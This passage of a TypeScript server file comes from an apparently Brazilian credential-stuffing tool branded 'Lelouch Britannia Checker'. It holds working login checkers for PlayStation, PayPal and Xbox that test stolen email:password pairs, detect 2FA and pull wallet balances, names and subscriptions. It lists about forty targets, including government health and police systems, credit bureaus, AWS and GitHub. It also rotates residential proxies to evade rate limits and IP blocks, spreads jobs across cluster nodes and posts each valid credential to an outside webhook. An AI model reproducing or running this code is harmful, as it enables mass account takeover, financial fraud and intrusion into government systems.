          const auto = sub.autoRenew ? "auto-renew" : "sem-auto";
          if (name) parts.push(`[${name}] vence:${exp} | ${auto}`);
        }
      } catch { /**/ }
    }

    // Wallet
    const walRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${accessToken}`,
      "-H", "Accept: application/json",
      "https://m.np.playstation.com/api/payment/v1/users/me/wallet",
    ], 10_000);
    if (walRes.statusCode === 200) {
      try {
        const wj  = JSON.parse(walRes.body) as Record<string, unknown>;
        const bal = wj.totalBalance ?? wj.balance ?? wj.walletBalance;
        if (bal !== undefined) {
          const amt  = (bal as Record<string, unknown>).valueInCents ?? bal;
          const cur  = (bal as Record<string, unknown>).currencyCode ?? "";
          if (amt !== undefined) parts.push(`saldo:${(Number(amt) / 100).toFixed(2)}${cur}`);
        }
      } catch { /**/ }
    }

    return { credential, login, status: "HIT", detail: parts.join(" | ") || "playstation_ok" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  PAYPAL CHECKER — email + senha (web scraping login flow)
//  Retorna: nome, saldo, moeda; detecta 2FA e senha errada
// ═══════════════════════════════════════════════════════════════════════════════
async function checkPayPal(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/pp_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
  try {
    // Step 1 — Carregar página de login (obter cookies + CSRF)
    const initRes = await runCurl([
      "--compressed", "-L", "--max-redirs", "5",
      "-c", cookieFile, "-b", cookieFile,
      "-A", DESKTOP_UA,
      "-H", "Accept: text/html,application/xhtml+xml",
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      "https://www.paypal.com/br/signin",
    ], 20_000);
    const initBody = initRes.body;
    const csrfMatch  = initBody.match(/"_csrf"\s*:\s*"([^"]+)"/i) ?? initBody.match(/name="_csrf"\s+value="([^"]+)"/i);
    const csrf       = csrfMatch?.[1] ?? "";
    const sessMatch  = initBody.match(/"sessionID"\s*:\s*"([^"]+)"/i) ?? initBody.match(/sessionID=([^&"'\s]+)/i);
    const sessionId  = sessMatch?.[1] ?? "";

    const formBase: string[] = [
      ...(csrf      ? ["--data-urlencode", `_csrf=${csrf}`]            : []),
      ...(sessionId ? ["--data-urlencode", `sessionID=${sessionId}`]   : []),
      "--data-urlencode", "pageType=signin",
    ];

    // Step 2 — Enviar senha (combined submit)
    const passRes = await runCurl([
      "--compressed", "-L", "--max-redirs", "5",
      "-c", cookieFile, "-b", cookieFile,
      "-X", "POST",
      "-A", DESKTOP_UA,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Accept: application/json,text/javascript,*/*",
      "-H", "Referer: https://www.paypal.com/br/signin",
      "--data-urlencode", `login_email=${login}`,
      "--data-urlencode", `login_password=${password}`,
      ...formBase,
      "https://www.paypal.com/signin/submit",
    ], 25_000);

    const pb = passRes.body;

    if (detect2FA(pb) || pb.includes("otp") || pb.includes("challengeId") || pb.includes("identity/auth"))
      return { credential, login, status: "ERROR", detail: "2fa_required" };
    if (pb.includes("PasswordIncorrect") || pb.includes("passwordIncorrect") || pb.includes("wrong password") || pb.includes("incorrect password"))
      return { credential, login, status: "FAIL",  detail: "senha_incorreta" };
    if (pb.includes("email_not_found") || pb.includes("unrecognized"))
      return { credential, login, status: "FAIL",  detail: "email_nao_cadastrado" };

    const isLoggedIn = passRes.statusCode === 302 || pb.includes("myaccount") || pb.includes("summary") || pb.includes("dashboard");
    if (!isLoggedIn) return { credential, login, status: "FAIL", detail: "login_failed" };

    // Step 3 — Dashboard (saldo + nome)
    const dashRes = await runCurl([
      "--compressed", "-L", "--max-redirs", "5",
      "-c", cookieFile, "-b", cookieFile,
      "-A", DESKTOP_UA,
      "https://www.paypal.com/myaccount/summary/",
    ], 20_000);
    const db    = dashRes.body;
    const parts: string[] = [];
    const balM  = db.match(/"availableBalance"\s*:\s*"([^"]+)"/i) ?? db.match(/primary-balance[^>]*>([^<]+)/i);
    if (balM) parts.push(`saldo:${balM[1].trim()}`);
    const nameM = db.match(/"displayName"\s*:\s*"([^"]+)"/i) ?? db.match(/greeting-name[^>]*>([^<]+)/i);
    if (nameM) parts.push(`nome:${nameM[1].trim()}`);

    if (parts.length === 0) parts.push("paypal_ok");
    return { credential, login, status: "HIT", detail: parts.join(" | ") };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  XBOX / MICROSOFT LIVE CHECKER — email + senha (Microsoft OAuth2 → Xbox Live)
//  Retorna: gamertag, tier (Gold/GamePass), linked subscriptions
// ═══════════════════════════════════════════════════════════════════════════════
const XBX_CLIENT_ID = "0000000048183522"; // Xbox public client ID (Xbox app)
const XBX_TIMEOUT   = 30_000;

async function checkXbox(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  try {
    // Step 1 — Microsoft Live OAuth2 password grant
    const msRes = await runCurlWithProxyRetry(px => [
      "--compressed", "-L", "--http1.1",
      "-X", "POST",
      ...px,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "--data-urlencode", "grant_type=password",
      "--data-urlencode", `client_id=${XBX_CLIENT_ID}`,
      "--data-urlencode", `username=${login}`,
      "--data-urlencode", `password=${password}`,
      "--data-urlencode", "scope=service::user.auth.xboxlive.com::MBI_SSL",
      "https://login.live.com/oauth20_token.srf",
    ], XBX_TIMEOUT, 3);

    if (msRes.statusCode !== 200) {
      try {
        const ej = JSON.parse(msRes.body) as Record<string, unknown>;
        const err  = String(ej.error ?? "");
        const desc = String(ej.error_description ?? "");
        if (err === "invalid_grant" || desc.includes("AADSTS50126") || desc.includes("50126"))
          return { credential, login, status: "FAIL", detail: "senha_invalida" };
        if (desc.includes("AADSTS50076") || desc.includes("50076") || err.includes("mfa") || desc.includes("two_factor"))
          return { credential, login, status: "ERROR", detail: "2fa_required" };
        if (err === "user_not_found" || desc.includes("50034") || desc.includes("not found"))
          return { credential, login, status: "FAIL", detail: "conta_nao_encontrada" };
        if (err.includes("too_many") || err.includes("rate"))
          return { credential, login, status: "ERROR", detail: "rate_limited" };
        if (err) return { credential, login, status: "FAIL", detail: `ms_error:${err}` };
      } catch { /**/ }
      return { credential, login, status: "ERROR", detail: `MS_HTTP_${msRes.statusCode}` };
    }

    let msj: Record<string, unknown>;
    try { msj = JSON.parse(msRes.body); } catch {
      return { credential, login, status: "ERROR", detail: "ms_parse_error" };
    }

    const accessToken = String(msj.access_token ?? "");
    if (!accessToken) return { credential, login, status: "ERROR", detail: "no_ms_token" };

    // Step 2 — Authenticate with Xbox Live (XBL)
    const xblRes = await runCurl([
      "--compressed", "-L",
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "--data-raw", JSON.stringify({
        RelyingParty: "http://auth.xboxlive.com",
        TokenType: "JWT",
        Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: `d=${accessToken}` },
      }),
      "https://user.auth.xboxlive.com/user/authenticate",
    ], 15_000);

    if (xblRes.statusCode !== 200)
      return { credential, login, status: "ERROR", detail: `XBL_HTTP_${xblRes.statusCode}` };

    let xblj: Record<string, unknown>;
    try { xblj = JSON.parse(xblRes.body); } catch {
      return { credential, login, status: "ERROR", detail: "xbl_parse_error" };
    }

    const xblToken = String(xblj.Token ?? "");
    const xblClaims = xblj.DisplayClaims as Record<string, unknown> | undefined;
    const uhs = String((xblClaims?.xui as Record<string, string>[])?.[0]?.uhs ?? "");
    if (!xblToken) return { credential, login, status: "ERROR", detail: "no_xbl_token" };

    // Step 3 — Get XSTS token (Xbox Secure Token Service)
    const xstsRes = await runCurl([
      "--compressed", "-L",
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "--data-raw", JSON.stringify({
        RelyingParty: "http://xboxlive.com",
        TokenType: "JWT",
        Properties: { UserTokens: [xblToken], SandboxId: "RETAIL" },
      }),
      "https://xsts.auth.xboxlive.com/xsts/authorize",
    ], 15_000);

    let xstsj: Record<string, unknown>;
    try { xstsj = JSON.parse(xstsRes.body); } catch {
      return { credential, login, status: "ERROR", detail: "xsts_parse_error" };
    }

    if (xstsRes.statusCode !== 200) {
      const xerr = Number((xstsj as Record<string, unknown>)?.XErr ?? 0);
      if (xerr === 2148916233) return { credential, login, status: "ERROR", detail: "no_xbox_account" };
      if (xerr === 2148916238) return { credential, login, status: "ERROR", detail: "child_account" };
      return { credential, login, status: "ERROR", detail: `XSTS_${xerr || xstsRes.statusCode}` };
    }

    const xstsToken = String(xstsj.Token ?? "");
    const authHeader = `XBL3.0 x=${uhs};${xstsToken}`;
    const parts: string[] = [];

    // Step 4 — Get Xbox profile (gamertag, tier)
    const profileRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: ${authHeader}`,
      "-H", "Accept: application/json",
      "-H", "x-xbl-contract-version: 3",
      "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,AccountTier,XboxOneGamertag,GameDisplayPicRaw",
    ], 10_000);

    if (profileRes.statusCode === 200) {
      try {
        const pj = JSON.parse(profileRes.body) as Record<string, unknown>;
        const users    = pj.profileUsers as Record<string, unknown>[] | undefined;
        const settings = (users?.[0]?.settings as Record<string, string>[]) ?? [];
        for (const s of settings) {
          if (s.id === "Gamertag" || s.id === "XboxOneGamertag") { if (s.value) parts.push(`gamertag:${s.value}`); }
          if (s.id === "AccountTier" && s.value) parts.push(`tier:${s.value}`);
        }
      } catch { /**/ }
    }

    // Step 5 — Check active subscriptions (Game Pass, Gold)
    const subsRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: ${authHeader}`,
      "-H", "Accept: application/json",
      "-H", "x-xbl-contract-version: 6",
      "https://subscriptions.xboxlive.com/subscriptions",
    ], 10_000);

    if (subsRes.statusCode === 200) {
      try {
        const sj = JSON.parse(subsRes.body) as Record<string, unknown>;
        const subs = (sj.subscriptions ?? sj.items ?? []) as Record<string, unknown>[];
        const actives = subs.filter(s =>
          String(s.state ?? s.status ?? s.statusCode ?? "").toLowerCase().includes("active") ||
          String(s.state ?? s.status ?? s.statusCode ?? "").toLowerCase().includes("subscribed")
        );
        if (actives.length > 0) {
          const names = actives.map(s => String(s.displayName ?? s.productName ?? s.productId ?? "unknown")).filter(Boolean);
          parts.push(`subs:${names.join(",").slice(0, 80)}`);
        }
      } catch { /**/ }
    }

    return { credential, login, status: "HIT", detail: parts.join(" | ") || "xbox_authenticated" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ── Runner ────────────────────────────────────────────────────────────────────
const CONCURRENCY: Record<CheckerTarget, number> = {
  datasus:       2,
  iseek:         2,
  sipni:         2,   // 4-step AJAX — conservative
  consultcenter: 3,
  mind7:         3,
  serpro:        4,   // lightweight JSON API
  sisreg:        2,   // HTML-heavy, slow server
  credilink:     4,   // JSON API — fast
  serasa:        2,   // heavy SPA — conservative
  crunchyroll:   6,   // OAuth2 — fast
  netflix:       3,   // shakti API — moderate
  amazon:        3,   // form scrape — moderate
  hbomax:        6,   // OAuth2 — fast
  disney:        4,   // BAMTech 2-step — moderate
  paramount:     6,   // REST API — fast
  sinesp:        3,   // Mobile JSON API — fast (no proxy needed)
  serasa_exp:    3,   // IAM REST API — fast
  instagram:     2,   // AJAX 2-step — moderate (rate-limited)
  sispes:        2,   // Java EE form auth — conservative
  sigma:         3,   // Form POST — moderate
  spotify:       2,   // OAuth2 flow via residential proxy — conservative
  receita:       3,   // Public CPF lookup — no auth, just validate
  // VPS / Hosting
  tubehosting:   2,   // WHMCS 2-step form — conservative
  hostinger:     3,   // REST API — fast
  vultr:         5,   // API key check — very fast
  digitalocean:  5,   // API token check — very fast
  linode:        5,   // API token check — very fast
  // Dev / Cloud
  github:        5,   // PAT token — very fast, no 2FA concern
  aws:           5,   // SigV4 STS — very fast, no MFA concern
  // Financeiro BR
  mercadopago:   2,   // 3-step web scrape — conservative
  ifood:         3,   // mobile API — moderate
  // Gaming
  riot:          2,   // 2-step OAuth2 + Valorant PVP.net — conservative
  roblox:        2,   // CSRF cookie flow — conservative (captcha-sensitive)
  epicgames:     3,   // OAuth2 + Fortnite profile — moderate
  steam:         2,   // RSA-encrypted login — conservative
  playstation:   3,   // Sony OAuth2 — moderate
  xbox:          4,   // Microsoft Live OAuth2 + XBL — moderate
  // Financeiro Global
  paypal:        2,   // web scraping PayPal — conservative
  // VPS / Hosting extra
  hetzner:       5,   // REST API key — very fast
  // Governo BR — CPF lookup
  cpf:           3,   // Receita Federal public lookup — moderate
};

function resolveChecker(target: CheckerTarget) {
  switch (target) {
    case "datasus":       return checkDataSUS;
    case "sipni":         return checkSipni;
    case "consultcenter": return checkConsultCenter;
    case "mind7":         return checkMind7;
    case "serpro":        return checkSerpro;
    case "sisreg":        return checkSisreg;
    case "credilink":     return checkCrediLink;
    case "serasa":        return checkSerasa;
    case "crunchyroll":   return checkCrunchyroll;
    case "netflix":       return checkNetflix;
    case "amazon":        return checkAmazonPrime;
    case "hbomax":        return checkHBOMax;
    case "disney":        return checkDisneyPlus;
    case "paramount":     return checkParamount;
    case "sinesp":        return checkSinesp;
    case "serasa_exp":    return checkSerasaExp;
    case "instagram":     return checkInstagram;
    case "sispes":        return checkSispEs;
    case "sigma":         return checkSigma;
    case "spotify":       return checkSpotify;
    case "receita":       return checkReceita;
    // VPS / Hosting
    case "tubehosting":   return checkTubeHosting;
    case "hostinger":     return checkHostinger;
    case "vultr":         return checkVultr;
    case "digitalocean":  return checkDigitalOcean;
    case "linode":        return checkLinode;
    // Dev / Cloud
    case "github":        return checkGitHub;
    case "aws":           return checkAWS;
    // Financeiro BR
    case "mercadopago":   return checkMercadoPago;
    case "ifood":         return checkIFood;
    // Gaming
    case "riot":          return checkRiot;
    case "roblox":        return checkRoblox;
    case "epicgames":     return checkEpicGames;
    case "steam":         return checkSteam;
    case "playstation":   return checkPlayStation;
    case "xbox":          return checkXbox;
    // Financeiro Global
    case "paypal":        return checkPayPal;
    // VPS / Hosting extra
    case "hetzner":       return checkHetzner;
    // Governo BR — CPF/CNPJ via Receita Federal
    case "cpf":           return checkReceita;
    default:              return checkIseek;
  }
}

async function runBulk(pairs: Array<{ login: string; password: string }>, target: CheckerTarget): Promise<CheckerBulkResponse> {
  const checker     = resolveChecker(target);
  const concurrency = CONCURRENCY[target];

  const results = await pMap(pairs, ({ login, password }) => checker(login, password), concurrency);

  return {
    total:   results.length,
    hits:    results.filter(r => r.status === "HIT").length,
    fails:   results.filter(r => r.status === "FAIL").length,
    errors:  results.filter(r => r.status === "ERROR").length,
    results,
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CHECKER JOB SYSTEM — background jobs that survive browser close/refresh
//  Jobs run server-side indefinitely (like attacks), clients subscribe via SSE.
// ═══════════════════════════════════════════════════════════════════════════════
interface CheckerJob {
  id:           string;
  target:       CheckerTarget;
  status:       "running" | "paused" | "done" | "stopped";
  hits:         number;
  fails:        number;
  errors:       number;
  retries:      number;
  total:        number;
  startedAt:    number;
  completedAt?: number;
  buffer:       object[];                        // replay to reconnecting clients
  subs:         Set<(ev: object) => void>;
  ctrl:         AbortController;
  paused:       boolean;
}

const checkerJobs = new Map<string, CheckerJob>();

// Prune completed/stopped jobs older than 1 hour every 5 minutes
setInterval(() => {
  const cutoff = Date.now() - 60 * 60_000;
  for (const [id, job] of checkerJobs) {
    if (job.status !== "running" && (job.completedAt ?? 0) < cutoff) {
      checkerJobs.delete(id);
    }
  }
}, 5 * 60_000).unref();

function jobEmit(job: CheckerJob, ev: object): void {
  job.buffer.push(ev);
  for (const fn of job.subs) fn(ev);
}

/** Subscribe an SSE response to a checker job (replays buffer, then streams new events). */
function sseSubscribe(job: CheckerJob, res: import("express").Response): void {
  res.setHeader("Content-Type",      "text/event-stream");
  res.setHeader("Cache-Control",     "no-cache, no-transform");
  res.setHeader("Connection",        "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  const write = (ev: object) => {
    if (res.writableEnded) return;
    res.write(`data: ${JSON.stringify(ev)}\n\n`);
    if ((ev as Record<string, unknown>).type === "done") res.end();
  };

  // Replay all buffered events (catches up a reconnecting client)
  for (const ev of job.buffer) write(ev);
  // Stop here only if the response already ended (done event was in the buffer)
  // or if the job has fully completed/stopped (not just paused — paused jobs
  // can resume, so subscribers should stay registered to receive future events).
  if (res.writableEnded || (job.status !== "running" && job.status !== "paused")) return;

  const hb = setInterval(() => { if (!res.writableEnded) res.write(": ping\n\n"); }, 20_000);
  job.subs.add(write);

  // Client disconnects → unsubscribe but job keeps running on the server
  res.on("close", () => { clearInterval(hb); job.subs.delete(write); });
}

/** Core checker runner — runs entirely server-side, independent of any HTTP connection. */
async function runCheckerJobAsync(
  job:           CheckerJob,
  pairs:         Array<{ login: string; password: string }>,
  webhookUrl?:   string,
  clusterNodes?: string[],
): Promise<void> {
  const { target } = job;
  const signal     = job.ctrl.signal;
  const startedAt  = Date.now();
  let consecutiveErrors = 0;
  let rateLimitHits     = 0;
  let rateLimitBackoff  = 0;

  const tl    = target.charAt(0).toUpperCase() + target.slice(1);
  const onHit = (credential: string, detail: string | undefined) => {
    if (webhookUrl?.startsWith("https://")) void fireHitWebhook(webhookUrl, credential, detail, tl);
  };

  jobEmit(job, { type: "start", total: job.total });

  const finish = () => {
    const elapsedMs   = Date.now() - startedAt;
    const credsPerMin = elapsedMs > 0 ? Math.round((job.total / elapsedMs) * 60_000) : 0;
    job.status      = job.ctrl.signal.aborted ? "stopped" : "done";
    job.completedAt = Date.now();
    jobEmit(job, { type: "done", total: job.total, hits: job.hits, fails: job.fails, errors: job.errors, retries: job.retries, elapsedMs, credsPerMin, stopped: job.status === "stopped" });
  };

  // ── Cluster mode ──────────────────────────────────────────────────────────
  const activeCluster = (clusterNodes ?? []).filter(n => n?.trim());
  if (activeCluster.length > 0) {
    const sliceSize    = Math.ceil(pairs.length / (activeCluster.length + 1));
    const rawCreds     = pairs.map(p => `${p.login}:${p.password}`);
    const localPairs   = pairs.slice(0, sliceSize);
    const remoteSlices = activeCluster.map((_, i) => rawCreds.slice(sliceSize * (i + 1), sliceSize * (i + 2)));

    let clusterDone = 0;
    const onPeerEvent = (ev: Record<string, unknown>) => {
      if (ev.status === "HIT")       job.hits++;
      else if (ev.status === "FAIL") job.fails++;
      else                           job.errors++;
      clusterDone++;
      jobEmit(job, { type: "result", ...ev, index: clusterDone, total: job.total, hits: job.hits, fails: job.fails, errors: job.errors, retries: job.retries, node: String(ev.node ?? ev._node ?? "peer") });
      if (ev.status === "HIT") onHit(String(ev.credential ?? ""), String(ev.detail ?? ""));
    };

    const peerPromises = activeCluster.map((nodeUrl, i) =>
      streamFromPeer(nodeUrl, remoteSlices[i] ?? [], target, webhookUrl, onPeerEvent, signal),
    );

    const checker     = resolveChecker(target);
    const concurrency = CONCURRENCY[target];
    const localMapper = async ({ login, password }: { login: string; password: string }) => {
      if (signal.aborted) return { credential: `${login}:?`, login, status: "ERROR" as const, detail: "aborted", wasRetried: false };
      const r = await checker(login, password);
      return { ...r, wasRetried: false };
    };

    await Promise.all([
      pMap(localPairs, localMapper, concurrency, (result, _idx) => {
        if (result.status === "HIT")       job.hits++;
        else if (result.status === "FAIL") job.fails++;
        else                               job.errors++;
        clusterDone++;
        jobEmit(job, { type: "result", ...result, index: clusterDone, total: job.total, hits: job.hits, fails: job.fails, errors: job.errors, retries: job.retries, node: "local" });
        if (result.status === "HIT") onHit(result.credential, result.detail);
      }),
      Promise.all(peerPromises),
    ]);

    finish();
    return;
  }

  // ── Normal (non-cluster) mode ─────────────────────────────────────────────
  const checker     = resolveChecker(target);
  const baseConcurrency = CONCURRENCY[target];
  const sem         = new AdaptiveSem(baseConcurrency);
  type CREx = CheckResult & { wasRetried: boolean };

  // Wait while the job is paused — resumes automatically when unpaused or aborted
  const waitWhilePaused = async () => {
    while (job.paused && !signal.aborted) await sleep(500);
  };

  const mapper = async ({ login, password }: { login: string; password: string }): Promise<CREx> => {
    if (signal.aborted) return { credential: `${login}:?`, login, status: "ERROR", detail: "aborted", wasRetried: false };
    await waitWhilePaused();
    if (signal.aborted) return { credential: `${login}:?`, login, status: "ERROR", detail: "aborted", wasRetried: false };

    // Acquire adaptive slot — blocks dynamically when rate-limited
    const release = await sem.take();
    try {
      if (consecutiveErrors >= 3) await sleep(Math.min(consecutiveErrors * 400, 4_000));
      if (rateLimitBackoff > 0) {
        await sleep(rateLimitBackoff);
        rateLimitBackoff = Math.max(0, rateLimitBackoff - 2_000);
      }

      let result = await checker(login, password);
      let wasRetried = false;

      const isRL = result.status === "ERROR" &&
        (result.detail?.includes("RATE_LIMITED") || result.detail?.includes("429") ||
         result.detail?.includes("too_many")     || result.detail?.includes("rate_limit") ||
         result.detail?.includes("HTTP_503")     || result.detail?.includes("HTTP_429"));

      // IP blocked by proxy — sleep longer to allow residential proxy to rotate IP, then retry
      const isProxyBlocked = result.status === "ERROR" &&
        (result.detail?.includes("PROXY_IP_BLOCKED") || result.detail?.includes("000") ||
         result.detail?.includes("IP_BLOCKED")       || result.detail?.includes("CONNECT_FAILED"));

      if (isRL) {
        rateLimitHits++;
        // Adaptive semaphore reduces live worker slots — exponential backoff returned
        rateLimitBackoff = sem.throttle();
        await sleep(rateLimitBackoff);
        const retry = await checker(login, password);
        if (retry.status !== "ERROR") { result = retry; wasRetried = true; rateLimitHits = Math.max(0, rateLimitHits - 1); }
      } else if (isProxyBlocked) {
        // Wait 2.5s for residential proxy to rotate to a new IP, then retry
        await sleep(2_500);
        const retry = await checker(login, password);
        if (retry.status !== "ERROR") { result = retry; wasRetried = true; }
        else { result = { ...result, detail: `PROXY_RETRY_FAILED:${result.detail ?? ""}` }; }
      } else if (result.status === "ERROR") {
        await sleep(800);
        const retry = await checker(login, password);
        if (retry.status !== "ERROR") { result = retry; wasRetried = true; }
      }

      // Second-pass confirmation for targets prone to false positives
      if (result.status === "HIT" && SECOND_PASS_TARGETS.has(target)) {
        await sleep(600);
        const verify = await checker(login, password);
        if (verify.status === "HIT") {
          result = { ...result, detail: `✓ ${result.detail ?? "confirmed"}` };
          sem.relax(); // confirmed success — restore a slot
        } else if (verify.status === "FAIL") {
          // First said HIT but second says FAIL — likely false positive, demote to ERROR
          result = { ...result, status: "ERROR", detail: `UNCONFIRMED:${result.detail ?? ""}` };
        }
        // Second returned ERROR (network issue) — give benefit of the doubt, keep original HIT
      } else if (result.status !== "ERROR") {
        sem.relax();
      }

      if (result.status === "ERROR") consecutiveErrors = Math.min(consecutiveErrors + 1, 20);
      else                           consecutiveErrors = Math.max(consecutiveErrors - 1, 0);

      return { ...result, wasRetried };
    } finally {
      release();
    }
  };

  await pMap(pairs, mapper, baseConcurrency, (result: CREx, index: number) => {
    if (result.status === "HIT")       job.hits++;
    else if (result.status === "FAIL") job.fails++;
    else                               job.errors++;
    if (result.wasRetried) job.retries++;
    jobEmit(job, { type: "result", ...result, index, total: job.total, hits: job.hits, fails: job.fails, errors: job.errors, retries: job.retries });
    if (result.status === "HIT") onHit(result.credential, result.detail);
  });

  finish();
}

const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood", "riot", "hetzner", "roblox", "epicgames", "steam", "playstation", "xbox", "paypal", "cpf"];

// ── Routes ────────────────────────────────────────────────────────────────────
// POST /api/checker/check
// body: { credentials: string[], target: "iseek" | "datasus" }
// body: { login: string, password: string, target: "iseek" | "datasus" }
router.post("/checker/check", async (req, res): Promise<void> => {
  const { credentials, login, password, target = "iseek" } = req.body as {
    credentials?: string[];
    login?:       string;
    password?:    string;
    target?:      CheckerTarget;
  };

  const validTargets = VALID_CHECKER_TARGETS;
  if (!validTargets.includes(target as CheckerTarget)) {
    res.status(400).json({ error: `target must be one of: ${VALID_CHECKER_TARGETS.join(", ")}` });
    return;
  }

  let pairs: Array<{ login: string; password: string }> = [];
  if (login && password) {
    pairs = [{ login: login.trim(), password: String(password).trim() }];
  } else if (Array.isArray(credentials)) {
    pairs = parseCredentials(credentials.join("\n"));
  } else {
    res.status(400).json({ error: "Provide { credentials: string[] } or { login, password }" });
    return;
  }

  if (pairs.length === 0) {
    res.status(400).json({ error: "No valid credentials found" });
    return;
  }

  const response = await runBulk(pairs, target);
  res.json(response);
});

// POST /api/checker/stream  — Server-Sent Events, sends each result as it completes
// Body: { credentials: string[], target: CheckerTarget }
// Events:
//   { type:"start",  total }
//   { type:"result", ...CheckResult, index, total, hits, fails, errors, retries, wasRetried }
//   { type:"done",   total, hits, fails, errors, retries, elapsedMs, credsPerMin }
async function fireHitWebhook(webhookUrl: string, credential: string, detail: string | undefined, targetLabel: string): Promise<void> {
  try {
    const embed = {
      title:       "✅ HIT ENCONTRADO",
      description: `**Credencial:** \`${credential}\`\n**Alvo:** ${targetLabel}${detail ? `\n**Detalhe:** ${detail}` : ""}`,
      color:       0x2ecc71,
      timestamp:   new Date().toISOString(),
      footer:      { text: "Lelouch Britannia Checker" },
    };
    await fetch(webhookUrl, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ username: "Lelouch Checker", embeds: [embed] }),
      signal:  AbortSignal.timeout(8_000),
    });
  } catch { /* ignore webhook errors — don't break the stream */ }
}

// ── Cluster checker stream helper ─────────────────────────────────────────────
// Reads an SSE stream from a peer node, forwarding result events.
async function streamFromPeer(
  nodeUrl:      string,
  creds:        string[],
  target:       CheckerTarget,
  webhookUrl:   string | undefined,
  onEvent:      (ev: Record<string, unknown>) => void,
  signal:       AbortSignal,
): Promise<{ hits: number; fails: number; errors: number; total: number }> {
  let hits = 0, fails = 0, errors = 0;
  const total = creds.length;
  try {
    const body: Record<string, unknown> = { credentials: creds, target };
    if (webhookUrl) body.webhookUrl = webhookUrl;
    const r = await fetch(`${nodeUrl.replace(/\/$/, "")}/api/checker/stream`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify(body),
      signal,
    });
    if (!r.ok || !r.body) return { hits, fails, errors, total };

    const reader  = r.body.getReader();
    const decoder = new TextDecoder();
    let buf = "";

    // eslint-disable-next-line no-constant-condition
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      buf += decoder.decode(value, { stream: true });
      const parts = buf.split("\n\n");
      buf = parts.pop() ?? "";
      for (const chunk of parts) {
        const dataLine = chunk.split("\n").find(l => l.startsWith("data:"));
        if (!dataLine) continue;
        try {
          const ev = JSON.parse(dataLine.slice(5).trim()) as Record<string, unknown>;
          if (ev.type === "result") {
            if (ev.status === "HIT")   hits++;
            else if (ev.status === "FAIL") fails++;
            else errors++;
            onEvent(ev);
          }
        } catch { /**/ }
      }
    }
  } catch { /**/ }
  return { hits, fails, errors, total };
}

// POST /api/checker/start — create background checker job, returns { jobId }
// Job runs server-side indefinitely regardless of browser close/refresh.
router.post("/checker/start", (req, res): void => {
  const { credentials, target = "iseek", webhookUrl, clusterNodes } = req.body as {
    credentials?:  string[];
    target?:       string;
    webhookUrl?:   string;
    clusterNodes?: string[];
  };

  if (!VALID_CHECKER_TARGETS.includes(target as CheckerTarget)) {
    res.status(400).json({ error: "Invalid target" }); return;
  }
  if (!Array.isArray(credentials) || credentials.length === 0) {
    res.status(400).json({ error: "credentials required" }); return;
  }
  const pairs = parseCredentials(credentials.join("\n"));
  if (pairs.length === 0) {
    res.status(400).json({ error: "No valid credentials" }); return;
  }

  const jobId = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 7)}`;
  const job: CheckerJob = {
    id: jobId, target: target as CheckerTarget, status: "running",
    hits: 0, fails: 0, errors: 0, retries: 0, total: pairs.length,
    startedAt: Date.now(), buffer: [], subs: new Set(), ctrl: new AbortController(),
    paused: false,
  };
  checkerJobs.set(jobId, job);

  // Fire and forget — job persists after this response closes
  void runCheckerJobAsync(job, pairs, webhookUrl, clusterNodes);

  res.json({ jobId, total: pairs.length, target });
});

// GET /api/checker/:jobId/stream — subscribe (or reconnect) to a running job's SSE
router.get("/checker/:jobId/stream", (req, res): void => {
  const job = checkerJobs.get(req.params.jobId);
  if (!job) { res.status(404).json({ error: "Job not found or expired" }); return; }
  sseSubscribe(job, res);
});

// GET /api/checker/jobs — list all active/recent checker jobs
router.get("/checker/jobs", (_req, res): void => {
  const list = [...checkerJobs.values()].map(j => ({
    id: j.id, target: j.target, status: j.status,
    hits: j.hits, fails: j.fails, errors: j.errors, total: j.total,
    startedAt: j.startedAt, completedAt: j.completedAt,
  }));
  res.json(list);
});

// DELETE /api/checker/:jobId — abort a running job
router.delete("/checker/:jobId", (req, res): void => {
  const job = checkerJobs.get(req.params.jobId);
  if (!job) { res.status(404).json({ error: "not found" }); return; }
  if (job.status !== "running" && job.status !== "paused") { res.json({ ok: true, status: job.status }); return; }
  job.ctrl.abort();
  // finish() inside runCheckerJobAsync will emit the "done" event via jobEmit
  res.json({ ok: true });
});

// PATCH /api/checker/:jobId/pause — pause a running job
router.patch("/checker/:jobId/pause", (req, res): void => {
  const job = checkerJobs.get(req.params.jobId);
  if (!job) { res.status(404).json({ error: "not found" }); return; }
  if (job.status !== "running") { res.json({ ok: false, reason: "not running" }); return; }
  job.paused = true;
  job.status = "paused";
